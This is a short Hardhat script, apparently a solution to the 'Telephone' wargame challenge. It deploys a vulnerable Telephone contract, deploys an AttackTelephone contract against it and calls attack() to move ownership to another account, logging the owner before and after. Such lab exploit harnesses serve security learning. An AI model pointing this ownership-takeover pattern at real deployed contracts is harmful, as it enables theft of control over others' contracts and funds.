const {ethers} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const accounts = await ethers.getSigners();
    const baseContractFactory = await hre.ethers.getContractFactory('Telephone');
    const payment1 = hre.ethers.utils.parseEther('1');
    const provider = hre.ethers.provider;
    const telephoneContract = await baseContractFactory.connect(accounts[1]).deploy();
    // const telephoneContract = await hre.ethers.getContractAt('Telephone', "0xC6bA8C3233eCF65B761049ef63466945c362EdD2");
    //
    await telephoneContract.deployed();
    console.log(telephoneContract.address)

    const attackContractFactory = await hre.ethers.getContractFactory('AttackTelephone');
    const attackTelephoneContract = await attackContractFactory.connect(accounts[1]).deploy(telephoneContract.address.toString());
    await attackTelephoneContract.deployed();
    console.log(attackTelephoneContract.address)
    console.log(await telephoneContract.owner());
    console.log(accounts[2].address);

    await attackTelephoneContract.attack(accounts[2].address.toString());
    console.log(await telephoneContract.owner());
}

main();